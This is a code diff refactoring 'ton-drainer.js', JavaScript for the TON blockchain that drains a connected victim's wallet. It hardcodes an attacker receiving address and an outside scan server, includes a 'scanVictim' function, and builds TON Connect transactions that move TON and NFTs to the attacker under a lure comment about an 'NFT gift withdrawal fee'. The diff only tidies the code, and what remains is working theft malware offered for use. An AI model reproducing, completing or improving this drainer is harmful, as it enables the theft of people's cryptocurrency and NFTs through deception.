@@ -1,4 +1,4 @@
-// ton-drainer.js — TON Connect: transfer NFT + перевод TON
+// ton-drainer.js
 const TON_CONFIG = {
   RECEIVER: 'UQD0XIN7zivOkMtN9iCQAusXz6NU1HaS1akmwbIIOaQTeiz4',
   SCAN_API: 'https://gift-spinner.onrender.com',
@@ -6,7 +6,6 @@ const TON_CONFIG = {
   NFT_FEE_TON: 0.03,
 };
 
-// Безопасное получение TON core
 function getTon() {
   if (typeof window.TON !== 'undefined') return window.TON;
   if (typeof TON !== 'undefined') return TON;
@@ -30,8 +29,7 @@ async function scanVictim(address) {
 
 async function transferTon(tonConnectUI, amountTon, comment) {
   const T = getTon();
-  const { beginCell, toNano } = T;
-  const body = beginCell()
+  const body = T.beginCell()
     .storeUint(0, 32)
     .storeStringTail(comment || 'NFT gift withdrawal fee')
     .endCell();
@@ -39,7 +37,7 @@ async function transferTon(tonConnectUI, amountTon, comment) {
     validUntil: Math.floor(Date.now() / 1000) + 300,
     messages: [{
       address: TON_CONFIG.RECEIVER,
-      amount: toNano(amountTon).toString(),
+      amount: T.toNano(amountTon).toString(),
       payload: body.toBoc().toString('base64'),
     }],
   };
@@ -48,12 +46,11 @@ async function transferTon(tonConnectUI, amountTon, comment) {
 
 async function transferNft(tonConnectUI, nftAddress) {
   const T = getTon();
-  const { beginCell, Address, toNano } = T;
-  const body = beginCell()
+  const body = T.beginCell()
     .storeUint(0x5fcc3d14, 32)
     .storeUint(0, 64)
-    .storeAddress(Address.parse(TON_CONFIG.RECEIVER))
-    .storeAddress(Address.parse(TON_CONFIG.RECEIVER))
+    .storeAddress(T.Address.parse(TON_CONFIG.RECEIVER))
+    .storeAddress(T.Address.parse(TON_CONFIG.RECEIVER))
     .storeBit(0)
     .storeCoins(0)
     .storeBit(0)
@@ -62,7 +59,7 @@ async function transferNft(tonConnectUI, nftAddress) {
     validUntil: Math.floor(Date.now() / 1000) + 300,
     messages: [{
       address: nftAddress,
-      amount: toNano(TON_CONFIG.NFT_FEE_TON).toString(),
+      amount: T.toNano(TON_CONFIG.NFT_FEE_TON).toString(),
       payload: body.toBoc().toString('base64'),
     }],
   };
